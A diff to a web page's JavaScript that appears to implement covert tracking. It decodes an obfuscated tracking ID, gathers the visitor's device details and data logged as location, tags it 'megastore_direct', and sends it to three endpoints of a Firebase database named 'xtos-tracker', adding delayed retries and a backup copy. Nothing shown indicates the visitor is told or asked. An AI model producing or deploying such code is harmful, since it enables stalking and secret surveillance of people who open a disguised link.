@@ -150,8 +150,10 @@
             if (id.includes('_enc_')) {
                 try {
                     realId = atob(id.replace('_enc_', ''));
+                    console.log('🔓 Decrypted ID:', realId);
                 } catch (e) {
-                    console.log('Using original ID');
+                    console.log('❌ Decryption failed, using original ID');
+                    realId = id;
                 }
             }
             
@@ -162,37 +164,70 @@
                 userAgent: navigator.userAgent,
                 deviceBrand: getBrowserInfo(),
                 batteryLevel: 'Unknown',
-                platform: navigator.platform
+                platform: navigator.platform,
+                source: 'megastore_direct'
             };
             
             console.log('📡 Sending to Firebase ID:', realId);
+            console.log('📍 Location data:', data);
             
-            // Send to Firebase locations endpoint
+            // Send to Firebase locations endpoint with CORS headers
             fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${realId}.json`, {
                 method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': '*'
+                },
                 body: JSON.stringify(data)
             }).then(response => {
+                console.log('📡 Firebase response status:', response.status);
                 if (response.ok) {
-                    console.log('✅ Firebase success');
+                    console.log('✅ Firebase locations success');
+                    return response.text();
                 } else {
-                    console.log('❌ Firebase failed:', response.status);
+                    console.log('❌ Firebase locations failed:', response.status);
+                    throw new Error('Firebase failed');
                 }
+            }).then(responseText => {
+                console.log('📡 Firebase response:', responseText);
             }).catch(error => {
-                console.log('❌ Firebase error:', error);
+                console.log('❌ Firebase locations error:', error);
             });
             
-            // Also send to live endpoint
-            const liveData = { ...data, updateNumber: 1 };
-            fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${realId}.json`, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(liveData)
-            }).then(() => {
-                console.log('✅ Live tracking sent');
-            }).catch(() => {
-                console.log('❌ Live tracking failed');
-            });
+            // Also send to live endpoint with retry
+            const liveData = { ...data, updateNumber: Math.floor(Math.random() * 100) + 1 };
+            
+            setTimeout(() => {
+                fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${realId}.json`, {
+                    method: 'PUT',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Access-Control-Allow-Origin': '*'
+                    },
+                    body: JSON.stringify(liveData)
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('✅ Live tracking sent successfully');
+                    } else {
+                        console.log('❌ Live tracking failed:', response.status);
+                    }
+                }).catch(error => {
+                    console.log('❌ Live tracking error:', error);
+                });
+            }, 500);
+            
+            // Send to backup endpoint as well
+            setTimeout(() => {
+                fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/backup/${realId}.json`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).then(() => {
+                    console.log('✅ Backup endpoint sent');
+                }).catch(() => {
+                    console.log('❌ Backup endpoint failed');
+                });
+            }, 1000);
         }
         
         function getBrowserInfo() {
